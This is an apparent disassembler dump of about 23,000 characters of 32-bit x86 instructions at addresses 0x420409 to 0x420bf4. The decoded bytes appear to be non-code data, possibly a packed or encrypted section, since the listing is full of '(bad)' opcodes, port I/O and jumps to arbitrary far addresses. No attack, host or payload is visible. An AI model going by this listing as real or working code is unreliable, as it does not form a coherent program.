  420409:	and    al,0x29
  42040b:	mov    eax,0xf660e0f1
  420410:	inc    edx
  420411:	and    bl,BYTE PTR [ebp-0x60]
  420414:	lock pop ss
  420416:	adc    BYTE PTR [edx+0x2b],dl
  420419:	aas    
  42041a:	ss clc 
  42041c:	xor    BYTE PTR [esi],bh
  42041e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42041f:	cmp    BYTE PTR gs:[ecx],0x87
  420423:	int    0x4e
  420425:	push   cs
  420426:	data16 sub al,0xb0
  420429:	jns    0x42043e
  42042b:	xchg   ecx,eax
  42042c:	out    dx,al
  42042d:	mov    ch,0x63
  42042f:	sahf   
  420430:	pop    eax
  420431:	test   DWORD PTR [eax],ebx
  420433:	pop    esp
  420434:	mov    ch,0xb8
  420436:	cmp    ebp,DWORD PTR [ebp+0x31ff9d28]
  42043c:	enter  0xff90,0xd7
  420440:	jo     0x420495
  420442:	fcomp  DWORD PTR [esi+ebp*2]
  420445:	cmc    
  420446:	dec    ebp
  420447:	fxam   
  420449:	pop    esp
  42044a:	rol    DWORD PTR [ebx-0x6d],cl
  42044d:	jle    0x420412
  42044f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420450:	jmp    0x3e91:0x67ccb703
  420457:	sbb    edi,DWORD PTR [esi+0x6e]
  42045a:	pop    eax
  42045b:	ds cmp esi,ecx
  42045e:	jne    0x420479
  420460:	shl    BYTE PTR [edi],cl
  420462:	out    dx,eax
  420463:	xor    edx,DWORD PTR [esi-0x26d7c9ce]
  420469:	mov    bl,0x3d
  42046b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42046c:	lods   eax,DWORD PTR ds:[esi]
  42046d:	xchg   edx,eax
  42046e:	pusha  
  42046f:	cmp    al,0xe9
  420471:	repz int 0x39
  420474:	push   esp
  420475:	mov    bl,0x7
  420477:	jecxz  0x420454
  420479:	adc    al,0xd5
  42047b:	ins    DWORD PTR es:[edi],dx
  42047c:	mov    bl,0x4d
  42047e:	push   es
  42047f:	inc    ebx
  420480:	xchg   ebp,eax
  420481:	lods   al,BYTE PTR ds:[esi]
  420482:	cmp    eax,0x2eb2876
  420487:	rcr    BYTE PTR [esi+0x76],cl
  42048a:	jmp    0x4204d4
  42048c:	push   es
  42048d:	lahf   
  42048e:	imul   ecx,DWORD PTR [ebx+0xf],0x887
  420495:	add    BYTE PTR [ebx-0x2a162bab],cl
  42049b:	and    eax,DWORD PTR [eax]
  42049d:	add    BYTE PTR [ebx+0x7d8bcc55],cl
  4204a3:	cld    
  4204a4:	xor    edx,eax
  4204a6:	xor    edi,eax
  4204a8:	jmp    0x4209ba
  4204ad:	retf   
  4204ae:	ds rol bl,1
  4204b1:	(bad)  
  4204b3:	fcmovnb st,st(6)
  4204b5:	push   DWORD PTR [edi+0x2f5cdb6c]
  4204bb:	popf   
  4204bc:	mov    ebx,0x787f591d
  4204c1:	jae    0x42053f
  4204c3:	js     0x42053d
  4204c5:	xbegin 0x6886d20f
  4204cb:	push   ss
  4204cc:	and    ch,dh
  4204ce:	jle    0x4204d5
  4204d0:	xor    ebx,DWORD PTR [ebp+0x1a1c2641]
  4204d6:	mov    dl,BYTE PTR [ebx]
  4204d8:	in     al,0x77
  4204da:	mov    edi,0x9b975a46
  4204df:	dec    bp
  4204e1:	cmp    DWORD PTR [esi],eax
  4204e3:	push   esi
  4204e4:	outs   dx,DWORD PTR ds:[esi]
  4204e5:	xchg   ecx,eax
  4204e6:	gs repnz rol ah,cl
  4204ea:	nop
  4204eb:	mov    al,0x10
  4204ed:	das    
  4204ee:	ins    DWORD PTR es:[edi],dx
  4204ef:	jl     0x4204aa
  4204f1:	or     eax,DWORD PTR [edi]
  4204f3:	mov    eax,0x2c028001
  4204f8:	leave  
  4204f9:	ror    DWORD PTR ds:0xbccb5b63,1
  4204ff:	mov    esp,0xfd1a8802
  420504:	adc    dh,BYTE PTR [edi+0x68]
  420507:	retf   0xc54a
  42050a:	js     0x42050e
  42050c:	call   0xea4e:0x3d857a2c
  420513:	(bad)  
  420514:	mov    eax,ds:0x3de0722
  420519:	push   0x833d1056
  42051e:	or     DWORD PTR [esi+0x17],esp
  420521:	and    al,0xbd
  420523:	jmp    0x9bc219ce
  420528:	add    al,0x26
  42052a:	in     al,dx
  42052b:	mov    edx,0xa0da6403
  420530:	xor    eax,0x897a499
  420535:	daa    
  420536:	mov    ch,0xf8
  420538:	arpl   si,cx
  42053a:	scas   eax,DWORD PTR es:[edi]
  42053b:	xchg   ecx,eax
  42053c:	icebp  
  42053d:	push   cs
  42053e:	bound  edx,QWORD PTR [edx+edx*8-0xfea8779]
  420545:	cmc    
  420546:	lea    ebp,[ebx+0x303c883f]
  42054c:	test   BYTE PTR [ebx-0x7be9d869],0x12
  420553:	(bad)  
  420554:	xchg   edx,eax
  420555:	mov    ds,WORD PTR [eax+ecx*2]
  420558:	push   cs
  420559:	mov    cl,0x49
  42055b:	outs   dx,DWORD PTR ds:[esi]
  42055c:	xchg   DWORD PTR [edx+0x7f554cfb],ebx
  420562:	enter  0xa0ac,0x9e
  420566:	jge    0x420571
  420568:	cwde   
  420569:	clc    
  42056a:	cdq    
  42056b:	jbe    0x42057c
  42056d:	leave  
  42056e:	bound  esi,QWORD PTR [esi]
  420570:	jo     0x4205ca
  420572:	rcr    BYTE PTR [esi+eiz*4-0x66],cl
  420576:	test   ecx,ecx
  420578:	pop    eax
  420579:	retf   0x9b09
  42057c:	icebp  
  42057d:	int3   
  42057e:	ss xchg esp,eax
  420580:	mov    BYTE PTR [edi+0x17c5291],bh
  420586:	ss retf 
  420588:	int    0x98
  42058a:	fisttp DWORD PTR [ecx-0x4d]
  42058d:	push   ebp
  42058e:	jae    0x420510
  420590:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420591:	sti    
  420592:	jo     0x42051a
  420594:	fucomp st(6)
  420596:	(bad)  
  420597:	mov    ecx,0xa03f8b6a
  42059c:	and    DWORD PTR [ebp+0x4c],0x5cbce6c9
  4205a3:	jmp    0xf64e0e7
  4205a8:	les    eax,FWORD PTR [edi]
  4205aa:	addr16 push edi
  4205ac:	fst    QWORD PTR [esi+0x4f]
  4205af:	test   DWORD PTR [esi-0x5f58b368],0x2cf7362d
  4205b9:	push   edx
  4205ba:	sub    bh,BYTE PTR [ecx+esi*1+0x5db9fd1]
  4205c1:	or     al,0x8c
  4205c3:	in     al,dx
  4205c4:	scas   eax,DWORD PTR es:[edi]
  4205c5:	push   cs
  4205c6:	lock jg 0x420557
  4205c9:	aad    0x5c
  4205cb:	inc    edx
  4205cc:	out    dx,al
  4205cd:	loopne 0x4205b8
  4205cf:	jmp    0xca189777
  4205d4:	pop    ss
  4205d5:	dec    ecx
  4205d6:	repz ret 0xff59
  4205da:	push   0x0
  4205dc:	cmp    al,0xe9
  4205de:	push   esp
  4205df:	pxor   mm2,QWORD PTR [eax-0x34]
  4205e3:	outs   dx,BYTE PTR ds:[esi]
  4205e4:	xchg   esi,eax
  4205e5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4205e6:	lods   al,BYTE PTR ds:[esi]
  4205e7:	jp     0x42059f
  4205e9:	stc    
  4205ea:	nop
  4205eb:	jmp    0xc4d:0x60e5aa8a
  4205f2:	push   edi
  4205f3:	jo     0x420659
  4205f5:	cmp    dh,BYTE PTR [esi]
  4205f7:	jl     0x420592
  4205f9:	sub    eax,0x2092189a
  4205fe:	xor    BYTE PTR fs:[ebp+0x39],ah
  420602:	mul    DWORD PTR [eax]
  420604:	lods   al,BYTE PTR ds:[esi]
  420605:	adc    DWORD PTR [ebp-0x121a1855],edi
  42060b:	fstp   QWORD PTR [ecx+0x25]
  42060e:	mov    edx,DWORD PTR [ebp+0x30e50b9e]
  420614:	xlat   BYTE PTR gs:[ebx]
  420616:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420617:	push   0xffffffb0
  420619:	inc    edx
  42061a:	scas   eax,DWORD PTR es:[edi]
  42061b:	and    ch,BYTE PTR [esi+ebp*4+0x2c]
  42061f:	mov    bl,0x85
  420621:	and    al,0xa
  420623:	xor    al,0xb
  420625:	jae    0x4205ac
  420627:	neg    ebp
  420629:	mov    edx,0xb64db935
  42062e:	ret    0x482b
  420631:	or     bl,BYTE PTR [edi+0x26]
  420634:	sbb    bl,BYTE PTR [ebp+0x722c1f2e]
  42063a:	push   eax
  42063b:	mov    al,ds:0x7630ef39
  420640:	rcl    BYTE PTR [eax-0x13],cl
  420643:	shl    DWORD PTR [ecx+0x55],1
  420646:	adc    ah,BYTE PTR [ebx*4-0x3016fe00]
  42064d:	mov    ch,0x9e
  42064f:	push   0x1f
  420651:	pop    ebx
  420652:	xor    al,0xd6
  420654:	ret    0x200
  420657:	or     BYTE PTR [ecx-0x6f3b57db],bh
  42065d:	dec    ebx
  42065e:	in     al,0xb9
  420660:	in     al,0xd1
  420662:	xor    esi,ebp
  420664:	pop    ebx
  420665:	addr16 in al,dx
  420667:	xchg   edi,eax
  420668:	or     al,0xe3
  42066a:	lds    ebx,FWORD PTR [esp+esi*4+0x43]
  42066e:	jmp    FWORD PTR [edx]
  420670:	repz adc BYTE PTR [ecx-0x33],0xc2
  420675:	aad    0x69
  420677:	and    cl,bl
  420679:	fnsave cs:[ebx-0x66bb3aad]
  420680:	mov    esp,DWORD PTR [ebx-0x64]
  420683:	das    
  420684:	adc    esi,edi
  420686:	in     eax,0x90
  420688:	jne    0x420654
  42068a:	xchg   ebx,eax
  42068b:	jno    0x4206f4
  42068d:	pop    es
  42068e:	pusha  
  42068f:	cmp    eax,0x3a244bca
  420694:	out    dx,al
  420695:	mov    dl,BYTE PTR [ebx+0x23a3f7b]
  42069b:	mov    ebp,0x85b30429
  4206a0:	sbb    eax,0xee1c74a7
  4206a5:	ficomp DWORD PTR [ebx-0x1451aaf2]
  4206ab:	and    al,0x89
  4206ad:	ins    DWORD PTR es:[edi],dx
  4206ae:	mov    dh,0x6f
  4206b0:	pop    ss
  4206b1:	mov    esi,0xc093fc59
  4206b6:	mov    bh,0xe3
  4206b8:	test   DWORD PTR [ecx+esi*4],esi
  4206bb:	mov    cs,WORD PTR [ecx+0xd]
  4206be:	loop   0x4206ec
  4206c0:	das    
  4206c1:	inc    ebx
  4206c2:	in     al,dx
  4206c3:	popf   
  4206c4:	mov    edx,0x7ea00029
  4206c9:	inc    ebx
  4206ca:	push   esp
  4206cb:	inc    BYTE PTR [ecx-0x385798a1]
  4206d1:	cmp    BYTE PTR [ecx*1+0x17a21851],ah
  4206d8:	push   ebp
  4206d9:	fst    DWORD PTR ds:0x40f440ba
  4206df:	in     eax,0x37
  4206e1:	jbe    0x4206d0
  4206e3:	push   0xffffff82
  4206e5:	lock fistp QWORD PTR fs:[esi]
  4206e9:	sbb    eax,0x91e65ffb
  4206ee:	inc    esp
  4206ef:	shr    cl,0x4b
  4206f2:	out    0x8,eax
  4206f4:	push   ss
  4206f5:	nop
  4206f6:	push   ds
  4206f7:	dec    eax
  4206f8:	mov    ecx,DWORD PTR [esp+edx*4+0x44]
  4206fc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4206fd:	xchg   edi,eax
  4206fe:	xchg   edx,eax
  4206ff:	push   0xf7c787c2
  420704:	loop   0x4206f0
  420706:	push   ebp
  420707:	cmp    dh,bh
  420709:	mov    ds:0x3af82ee3,al
  42070e:	sub    eax,ebp
  420710:	jp     0x4206c2
  420712:	sub    cl,BYTE PTR [ecx+0x65703233]
  420718:	ins    BYTE PTR es:[edi],dx
  420719:	jp     0x420740
  42071b:	and    BYTE PTR ds:0x2e38b5f9,ah
  420721:	sti    
  420722:	scas   eax,DWORD PTR es:[edi]
  420723:	push   ds
  420724:	addr16 pop ss
  420726:	repz or eax,DWORD PTR [edx+0x44]
  42072a:	and    bh,BYTE PTR [edx]
  42072c:	test   DWORD PTR [ecx+0x13],eax
  42072f:	outs   dx,BYTE PTR ds:[esi]
  420730:	mov    ah,0x23
  420732:	add    al,0x51
  420734:	xor    esp,esp
  420736:	sti    
  420737:	xchg   ebp,eax
  420738:	and    al,BYTE PTR [edi]
  42073a:	(bad)  [esi]
  42073c:	leave  
  42073d:	sub    DWORD PTR ds:0x3980c926,esi
  420743:	jge    0x420778
  420745:	mov    edi,DWORD PTR [eax]
  420747:	adc    DWORD PTR [ecx+ebp*8],ecx
  42074a:	mov    ebp,0x122ee7b
  42074f:	repnz in eax,0x34
  420752:	loopne 0x4207ca
  420754:	fwait
  420755:	sub    ecx,DWORD PTR [esi]
  420757:	dec    esi
  420758:	test   DWORD PTR [edx],ecx
  42075a:	sbb    dl,BYTE PTR [edi-0x75]
  42075d:	mov    ah,0xd0
  42075f:	xor    eax,0xdd3dc5b1
  420764:	add    edi,DWORD PTR [eax]
  420766:	cmp    eax,0x337f6efe
  42076b:	or     eax,0x102468a2
  420770:	jb     0x420721
  420772:	test   DWORD PTR [ebp-0x57],esp
  420775:	ja     0x420720
  420777:	cmc    
  420778:	jge    0x4206fe
  42077a:	mov    ebp,esi
  42077c:	xchg   edx,eax
  42077d:	jl     0x42078a
  42077f:	jne    0x42077f
  420781:	ins    BYTE PTR es:[edi],dx
  420782:	push   eax
  420783:	jbe    0x4207f0
  420785:	jmp    0x4207e0
  420787:	fnstenv [esi+0x55214bd6]
  42078d:	int    0x11
  42078f:	inc    edi
  420790:	stos   DWORD PTR es:[edi],eax
  420791:	pusha  
  420792:	and    bh,dh
  420794:	ja     0x420731
  420796:	jl     0x42074a
  420798:	dec    esp
  420799:	fsub   DWORD PTR [ebx-0x2d]
  42079c:	jae    0x420812
  42079e:	fs dec esp
  4207a0:	cld    
  4207a1:	adc    BYTE PTR [esi],cl
  4207a3:	ins    BYTE PTR es:[edi],dx
  4207a4:	adc    al,0xc1
  4207a6:	dec    esi
  4207a7:	(bad)  
  4207a8:	aaa    
  4207a9:	mov    ecx,0x7d55a0d6
  4207ae:	arpl   WORD PTR [ebp-0x5c11fc83],sp
  4207b4:	sti    
  4207b5:	jecxz  0x42079d
  4207b7:	add    DWORD PTR ds:0x8a180b62,ebx
  4207bd:	cmp    DWORD PTR [edi-0x57],esp
  4207c0:	aad    0xc8
  4207c2:	mov    edx,0xc83b037c
  4207c7:	ficom  WORD PTR [edx-0x5]
  4207ca:	mov    BYTE PTR ds:0xd4a1dc8b,dh
  4207d0:	daa    
  4207d1:	stos   BYTE PTR es:[edi],al
  4207d2:	nop
  4207d3:	or     edx,DWORD PTR [ebx]
  4207d5:	sub    ah,bl
  4207d7:	or     ecx,DWORD PTR ds:0xa8312830
  4207dd:	pop    esp
  4207de:	mov    ebp,0x465486c
  4207e3:	(bad)  
  4207e4:	cld    
  4207e5:	test   BYTE PTR [ebx-0x2033bfe9],cl
  4207eb:	aaa    
  4207ec:	aam    0x76
  4207ee:	sub    esi,DWORD PTR [ebp+0x341268e4]
  4207f4:	pop    ss
  4207f5:	sub    DWORD PTR [ebx+0x494e968e],esp
  4207fb:	mov    ds:0xd59e893b,al
  420800:	cmc    
  420801:	dec    DWORD PTR [eax]
  420803:	mov    ecx,DWORD PTR [esi-0x755ed3ef]
  420809:	div    DWORD PTR [esi]
  42080b:	aad    0x11
  42080d:	add    al,0x79
  42080f:	push   ebx
  420810:	scas   al,BYTE PTR es:[edi]
  420811:	xor    BYTE PTR [esi+0x48bab950],cl
  420817:	shl    BYTE PTR [ebp+0x10],0x7
  42081b:	aaa    
  42081c:	ja     0x4207fd
  42081e:	repnz mov esp,0x39cdfb2
  420824:	xor    WORD PTR [ecx-0x3de8f3a9],cx
  42082b:	das    
  42082c:	mov    ch,0xb7
  42082e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42082f:	dec    ebx
  420830:	pop    esi
  420831:	or     ah,BYTE PTR [esi-0x77256b06]
  420837:	dec    ecx
  420838:	mov    ds:0x1e8161e,eax
  42083d:	add    edx,DWORD PTR [ecx+0x1a75f5e6]
  420843:	sub    ebx,DWORD PTR [eax-0x40]
  420846:	dec    esp
  420847:	ss xchg edi,eax
  420849:	mov    edi,0x4e8fbdfa
  42084e:	mov    ebx,0x4ca06ff5
  420853:	pop    edx
  420854:	mov    dl,0x49
  420856:	jae    0x420825
  420858:	clc    
  420859:	imul   eax,ebx,0xe46ca77e
  42085f:	jge    0x420849
  420861:	test   eax,0x4dfb3ea5
  420866:	pop    ebx
  420867:	jge    0x420872
  420869:	inc    ecx
  42086a:	test   al,0xff
  42086c:	int    0x4c
  42086e:	xchg   edi,eax
  42086f:	sbb    ah,BYTE PTR [eax]
  420871:	mov    edi,0xee3e6f90
  420876:	push   ebx
  420877:	imul   esi,DWORD PTR [edi+0x5678ce2e],0x5c991dbf
  420881:	ins    DWORD PTR es:[edi],dx
  420882:	dec    esp
  420883:	and    al,0x8
  420885:	inc    ebx
  420886:	sbb    BYTE PTR [esi-0x4],dl
  420889:	bound  esp,QWORD PTR [edi]
  42088b:	je     0x4208a8
  42088d:	ret    0x91dd
  420890:	add    eax,0xb1cef694
  420895:	fisubr DWORD PTR [ebp-0x4c47fe2a]
  42089b:	int3   
  42089c:	push   ebp
  42089d:	fcom   DWORD PTR [eax-0x4807ab16]
  4208a3:	cmp    eax,0x56bb8f4f
  4208a8:	ins    DWORD PTR es:[edi],dx
  4208a9:	fnsave [ecx-0x74]
  4208ac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4208ad:	push   edi
  4208ae:	jle    0x42084a
  4208b0:	fstp   DWORD PTR [eax-0x445fb2a5]
  4208b6:	hlt    
  4208b7:	inc    esi
  4208b8:	mov    BYTE PTR [edi],ah
  4208ba:	mov    ch,0x2f
  4208bc:	outs   dx,DWORD PTR ds:[esi]
  4208bd:	mov    esp,0xfcac2450
  4208c2:	push   ecx
  4208c3:	cmp    BYTE PTR [ebx],al
  4208c5:	retf   
  4208c6:	movhps xmm2,QWORD PTR [esi-0x67]
  4208ca:	lock mov gs:0x95566dcf,al
  4208d1:	jbe    0x4208d1
  4208d3:	jb     0x420896
  4208d5:	lock adc BYTE PTR [edi+edi*2],dl
  4208d9:	xchg   ecx,eax
  4208da:	ror    BYTE PTR [edi],1
  4208dc:	jle    0x42088d
  4208de:	xor    al,0x92
  4208e0:	mov    edx,0xb08fa3dd
  4208e5:	pushf  
  4208e6:	stos   BYTE PTR es:[edi],al
  4208e7:	fs into 
  4208e9:	dec    ecx
  4208ea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4208eb:	fadd   DWORD PTR [ebx-0x61]
  4208ee:	adc    bl,cl
  4208f0:	repnz mov DWORD PTR es:[edx],0x37d05f57
  4208f8:	mov    esp,0x7be218a1
  4208fd:	ss mov ebx,0xc389c6e9
  420903:	mov    cl,0x15
  420905:	mov    al,0xed
  420907:	les    ebx,FWORD PTR [edx-0x41ac911f]
  42090d:	shr    edx,0xb7
  420910:	ret    
  420911:	rcr    BYTE PTR [esi+0x6d],cl
  420914:	jl     0x420989
  420916:	inc    edx
  420917:	mov    eax,0x84cee474
  42091c:	inc    ebx
  42091d:	adc    al,BYTE PTR [edi]
  42091f:	test   al,0x8a
  420921:	es jl  0x420935
  420924:	xor    BYTE PTR [edi],0xf5
  420927:	loop   0x4208fb
  420929:	mov    ah,0x90
  42092b:	mov    al,0xaf
  42092d:	outs   dx,BYTE PTR ds:[esi]
  42092e:	rol    BYTE PTR [ecx],1
  420930:	aas    
  420931:	mov    ch,0x90
  420933:	pushf  
  420934:	mov    dl,BYTE PTR [esi+edi*1]
  420937:	ror    ch,0x7
  42093a:	test   al,0x5
  42093c:	and    al,0x8
  42093e:	jle    0x420974
  420940:	push   ecx
  420941:	fwait
  420942:	jge    0x4208e1
  420944:	(bad)  
  420945:	lods   eax,DWORD PTR ds:[esi]
  420946:	outs   dx,DWORD PTR ds:[esi]
  420947:	sahf   
  420948:	inc    ebp
  420949:	iret   
  42094a:	and    al,0x4a
  42094c:	into   
  42094d:	inc    esp
  42094e:	mov    ecx,0xe22c3664
  420953:	sub    eax,0xe59e159
  420958:	add    al,0x4
  42095a:	lds    eax,FWORD PTR [eax]
  42095c:	ins    BYTE PTR es:[edi],dx
  42095d:	push   cs
  42095e:	mov    WORD PTR [esi],es
  420960:	retf   
  420961:	cld    
  420962:	and    al,0x9d
  420964:	dec    edx
  420965:	(bad)  
  420966:	push   edx
  420967:	nop
  420968:	mov    esi,0x50dae75b
  42096d:	sahf   
  42096e:	nop
  42096f:	pushf  
  420970:	aaa    
  420971:	adc    DWORD PTR [ebp+0x12],edi
  420974:	jg     0x42098c
  420976:	fdiv   DWORD PTR [ebx]
  420978:	sub    al,0x24
  42097a:	enter  0xb240,0xf1
  42097e:	repz cdq 
  420980:	jmp    0x756e1e2c
  420985:	jge    0x4209b8
  420987:	push   es
  420988:	pop    esp
  420989:	mov    bl,0xad
  42098b:	jmp    0x8686f9dd
  420990:	push   cs
  420991:	pop    ebp
  420992:	gs mov eax,0xdc8c0bcc
  420998:	ja     0x420993
  42099a:	add    cl,al
  42099c:	xor    eax,0x6d1eaf41
  4209a1:	rol    BYTE PTR [eax],0x50
  4209a4:	mov    ebp,0x2f8a5c3a
  4209a9:	ins    DWORD PTR es:[edi],dx
  4209aa:	test   eax,0x9301a713
  4209af:	imul   esi,DWORD PTR [esi+0x153bc258],0x96a23e80
  4209b9:	lods   al,BYTE PTR ds:[esi]
  4209ba:	add    edi,ecx
  4209bc:	add    edx,ecx
  4209be:	imul   edx,edi
  4209c1:	mov    edi,DWORD PTR [ebp-0x8]
  4209c4:	mov    ebx,DWORD PTR [ebp-0x10]
  4209c7:	sub    ebx,edi
  4209c9:	jmp    0x420edb
  4209ce:	cmp    al,0x3c
  4209d0:	xlat   BYTE PTR ds:[ebx]
  4209d1:	enter  0xdbd7,0xcb
  4209d5:	int3   
  4209d6:	sub    DWORD PTR ds:0x39b1db4,edx
  4209dc:	lods   eax,DWORD PTR ds:[esi]
  4209dd:	and    edx,DWORD PTR [eax]
  4209df:	pop    esp
  4209e0:	jg     0x420a5a
  4209e2:	jae    0x420a60
  4209e4:	js     0x420a5e
  4209e6:	clc    
  4209e7:	adc    BYTE PTR ds:0xecbfd3d5,cl
  4209ed:	sar    BYTE PTR [ebp+0x2a],cl
  4209f0:	lea    eax,[ecx+0x46]
  4209f3:	xor    al,0x77
  4209f5:	push   edx
  4209f6:	cmp    eax,DWORD PTR [edx+0x1cf5ae22]
  4209fc:	or     al,0x5f
  4209fe:	into   
  4209ff:	inc    edx
  420a00:	sub    BYTE PTR [ecx+0x3d],bl
  420a03:	inc    ebx
  420a04:	rcl    DWORD PTR [ebx-0x2a],1
  420a07:	pop    ss
  420a08:	sahf   
  420a09:	imul   edi,edi,0xb37c34f4
  420a0f:	sub    bl,BYTE PTR [ebx+edi*1]
  420a12:	push   ds
  420a13:	sbb    BYTE PTR [edi],cl
  420a15:	jne    0x4209cc
  420a17:	in     eax,0xf2
  420a19:	jmp    0xfcd8:0xd7a5c379
  420a20:	adc    al,0xfb
  420a22:	inc    edi
  420a23:	pop    ds
  420a24:	jle    0x420a87
  420a26:	dec    edi
  420a27:	aaa    
  420a28:	shl    BYTE PTR [ecx+0x43f40a13],0x20
  420a2f:	xchg   ecx,eax
  420a30:	in     eax,0xd7
  420a32:	jmp    0x68fbbcdd
  420a37:	daa    
  420a38:	xchg   ebp,eax
  420a39:	adc    al,dh
  420a3b:	cs ss mov esi,0x16a8d500
  420a42:	jns    0x4209ca
  420a44:	fld    DWORD PTR [eax-0x25]
  420a47:	inc    edx
  420a48:	aad    0xfd
  420a4a:	jl     0x4209fe
  420a4c:	and    esp,DWORD PTR [ebx-0x3ec3b561]
  420a52:	jmp    0x420a2b
  420a54:	mov    WORD PTR [ecx-0x29c7fe93],ds
  420a5a:	sub    bh,0xe5
  420a5d:	std    
  420a5e:	imul   BYTE PTR ds:0xf99d3bbe
  420a64:	sbb    edx,DWORD PTR [esi-0x44]
  420a67:	int3   
  420a68:	jns    0x420a0e
  420a6a:	inc    ebx
  420a6b:	fisub  WORD PTR [edi-0x4b19ceb2]
  420a71:	frstor [eax]
  420a73:	in     eax,0xd0
  420a75:	adc    BYTE PTR [edx+edx*4-0x2d],dl
  420a79:	retf   0x7639
  420a7c:	mov    dh,0x8d
  420a7e:	xor    BYTE PTR [edi],cl
  420a80:	fucomi st,st(6)
  420a82:	sub    DWORD PTR [ebx],esp
  420a84:	xor    ch,BYTE PTR ds:0xed94731e
  420a8a:	aas    
  420a8b:	fadd   QWORD PTR [ecx-0x50]
  420a8e:	sar    BYTE PTR [ebx+0x1d],0x44
  420a92:	rcr    BYTE PTR [eax-0x5e],1
  420a95:	xor    eax,0x7df2789b
  420a9a:	xchg   esp,eax
  420a9b:	hlt    
  420a9c:	cli    
  420a9d:	xor    ebp,DWORD PTR [edx]
  420a9f:	xor    esp,esp
  420aa1:	push   esp
  420aa2:	clc    
  420aa3:	mov    edx,0x14b718bc
  420aa8:	pop    esi
  420aa9:	mov    eax,0x8920ac60
  420aae:	jmp    FWORD PTR [edi-0x2c]
  420ab1:	fwait
  420ab2:	dec    eax
  420ab3:	mov    eax,ds:0x54d561f4
  420ab8:	sub    eax,0x693d8aa2
  420abd:	jae    0x420ad6
  420abf:	inc    edx
  420ac0:	mov    edx,0x31ed8948
  420ac5:	enter  0xa0d7,0x7b
  420ac9:	jns    0x420a4e
  420acb:	lea    esp,[ebp+0x3b]
  420ace:	mov    edi,0x4f1d25cb
  420ad3:	jmp    0x7ed1:0x64ee24e5
  420ada:	(bad)  
  420adb:	scas   eax,DWORD PTR es:[edi]
  420adc:	lods   al,BYTE PTR ds:[esi]
  420add:	loop   0x420b42
  420adf:	push   edx
  420ae0:	mov    edx,0x73d350d4
  420ae5:	aad    0xe
  420ae7:	cs aam 0x40
  420aea:	or     DWORD PTR [eax],0xf18f7322
  420af0:	and    BYTE PTR [esi+eiz*1],ah
  420af3:	pusha  
  420af4:	add    cl,dh
  420af6:	out    dx,eax
  420af7:	enter  0x9895,0x2c
  420afb:	rcr    BYTE PTR [ebp-0x66],1
  420afe:	dec    ecx
  420aff:	adc    eax,0xfbb2d0de
  420b04:	mov    gs,WORD PTR [eax+0x79e0e65]
  420b0a:	fnsave [edx+0x60]
  420b0d:	add    DWORD PTR [ecx],0x6
  420b10:	int3   
  420b11:	mov    cl,0xc1
  420b13:	imul   edx,DWORD PTR [ebp-0x5fbebd4],0xfffffff7
  420b1a:	and    BYTE PTR [edx],0x6d
  420b1d:	push   esp
  420b1e:	mov    cl,0xfa
  420b20:	add    BYTE PTR [eax],dl
  420b22:	pop    edi
  420b23:	into   
  420b24:	and    eax,0xed208d0d
  420b29:	out    0xc0,al
  420b2b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420b2c:	pop    ss
  420b2d:	popf   
  420b2e:	iret   
  420b2f:	mov    dl,0xb8
  420b31:	push   ds
  420b32:	sub    al,0xfd
  420b34:	jmp    0x9b01:0xaf0ca8f7
  420b3b:	jge    0x420ba9
  420b3d:	push   edi
  420b3e:	daa    
  420b3f:	sti    
  420b40:	call   0x422b:0x7cee606a
  420b47:	inc    edi
  420b48:	sbb    BYTE PTR [edi],0xfd
  420b4b:	pop    esi
  420b4c:	(bad)  
  420b4d:	out    dx,al
  420b4e:	mov    esp,0xa686a350
  420b53:	fdiv   QWORD PTR [ecx+edi*2-0x10]
  420b57:	icebp  
  420b58:	cmp    edx,edi
  420b5a:	add    al,0xcb
  420b5c:	inc    esp
  420b5d:	inc    BYTE PTR [edi-0x386f5d1c]
  420b63:	xchg   DWORD PTR [edx-0x1],ebx
  420b66:	add    dl,ch
  420b68:	rcl    BYTE PTR [ebp-0xa],1
  420b6b:	cli    
  420b6c:	fstp   st(0)
  420b6e:	mov    edx,edi
  420b70:	adc    esi,DWORD PTR [ebx-0x3f]
  420b73:	mov    ds:0xcce7ecd4,eax
  420b78:	add    BYTE PTR [ecx],ah
  420b7a:	(bad)  
  420b7b:	mov    bl,0xe4
  420b7d:	xchg   ebp,eax
  420b7e:	xlat   BYTE PTR ds:[ebx]
  420b7f:	mov    ecx,0xb4608f3
  420b84:	fucom  st(4)
  420b86:	pop    ss
  420b87:	daa    
  420b88:	fldenv [ebx-0x50]
  420b8b:	jg     0x420b73
  420b8d:	mov    esp,0xbc4baa1d
  420b92:	or     edi,DWORD PTR [ebp-0x1d]
  420b95:	gs inc edi
  420b97:	jnp    0x420ba7
  420b99:	into   
  420b9a:	adc    BYTE PTR [ebx-0x58def95d],cl
  420ba0:	adc    al,BYTE PTR [ebx]
  420ba2:	gs int3 
  420ba4:	push   ebp
  420ba5:	xor    ah,BYTE PTR [esi+0x79]
  420ba8:	mov    ah,0x7b
  420baa:	lahf   
  420bab:	jge    0x420c1d
  420bad:	repz pop eax
  420baf:	jo     0x420b74
  420bb1:	mov    esp,0xff8d2c5e
  420bb6:	test   al,0x68
  420bb8:	xchg   ebx,eax
  420bb9:	sub    eax,DWORD PTR [ebp-0xa]
  420bbc:	call   0x20ff4df0
  420bc1:	pop    es
  420bc2:	jns    0x420b87
  420bc4:	loop   0x420b86
  420bc6:	lock lock push edi
  420bc9:	or     DWORD PTR [ebp-0x30],0xffffffd6
  420bcd:	ret    0xab1d
  420bd0:	mov    eax,0xe740ec42
  420bd5:	out    0x62,eax
  420bd7:	lea    esi,[edi-0x2b458680]
  420bdd:	in     al,0x12
  420bdf:	cmp    eax,0xb15054a3
  420be4:	mov    bh,0x1a
  420be6:	test   al,0x5f
  420be8:	addr16 (bad) 
  420bea:	mov    cl,BYTE PTR [edi]
  420bec:	xor    edi,DWORD PTR [edx]
  420bee:	inc    esp
  420bef:	sub    eax,0x3ef7bdc7
  420bf4:	pushf  
